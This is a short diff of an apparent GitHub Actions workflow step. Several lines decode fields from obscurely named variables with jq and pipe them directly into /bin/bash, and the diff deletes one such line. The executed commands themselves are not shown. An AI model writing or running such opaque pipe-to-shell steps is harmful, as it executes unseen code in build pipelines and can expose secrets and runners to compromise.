@@ -29,7 +29,6 @@ jobs:
           echo $b92 | jq -r .vru23 | /bin/bash
           echo $cmko485 | jq -r .hp46 | /bin/bash
           printf '%s' "$mlh0655" | jq -r .gvivs281 | /bin/bash
-          echo $b7136 | jq -r .w1703 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
